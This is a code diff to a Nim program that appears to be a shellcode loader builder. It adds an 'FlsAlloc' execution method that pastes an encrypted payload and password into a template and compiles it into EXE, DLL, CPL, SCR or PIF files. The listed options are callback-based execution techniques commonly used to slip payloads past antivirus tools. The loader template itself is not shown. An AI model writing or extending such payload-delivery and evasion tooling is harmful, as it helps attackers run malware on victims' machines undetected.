@@ -68,6 +68,7 @@ CertEnumSystemStore [enumsystemstore]
 EnumDesktopWindows [enumdesktop]
 EnumTimeFormatsEx [enumtime]
 EnumCalendarInfoW [enumcalendar]
+FlsAlloc  [flsalloc]
 
 File types currently available:
 EXE - bread and butter
@@ -897,6 +898,61 @@ proc main() =
             file_path.writeFile(file_target)
         else:
             echo "\n"
+    elif apiMethod == "flsalloc":
+
+            if fileType != "xll": 
+                let file_path = ".\\apiMethods\\FlsAlloc\\FlsAlloc.nim"
+                var file_target = file_path.readFile()
+                
+                let placeholder = "REPLACE_ME"
+                let replacement =  encodedCrypted
+                file_target = file_target.replace(placeholder, replacement)
+                file_path.writeFile(file_target) 
+
+                
+                let pass_new = newpassword
+                let replace_pass_new = "PASSWORD_ME"
+                file_target = file_target.replace(replace_pass_new, pass_new)
+                file_path.writeFile(file_target)
+
+
+                #add dictionary stuff perhaps later?
+                #let dic_file_path = ".\\apiMethods\\FlsAlloc\\dictionary.txt"
+                #var dictionary = dic_file_path.readFile()
+                #let dictionary_placeholder = "DICTIONARY_ME"
+                #let dictionary_replacement = dictionary
+
+
+                if fileType == "exe":
+                    discard execShellCmd("nim -d:release --out:FlsAlloc.exe --app:gui c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                elif fileType == "dll":
+                    discard execShellCmd("nim -d:release --out:FlsAlloc.dll --app:lib c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                elif fileType == "cpl":
+                    discard execShellCmd("nim -d:release --out:FlsAlloc.cpl --app:lib c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                elif fileType == "scr":
+                    discard execShellCmd("nim -d:release --out:FlsAlloc.scr --app:gui c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                elif fileType == "pif": #experimenting with PIF...
+                    discard execShellCmd("nim -d:release --out:FlsAlloc.pif --app:gui c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                else:
+                    echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
+                let placeholder_new = encodedCrypted
+                let replacement_new = "REPLACE_ME"
+                file_target = file_target.replace(placeholder_new, replacement_new)
+                file_path.writeFile(file_target)
+
+                #you too password!
+                let password_revert = newpassword
+                let original_pass = "PASSWORD_ME"
+                file_target = file_target.replace(password_revert, original_pass)
+                file_path.writeFile(file_target)
+            else: 
+                echo "\n"
+
+            if fileType == "xll":
+
+                echo "Not yet implemented. Might not even implement it."
+            else:
+                echo "\n"
 
 
 
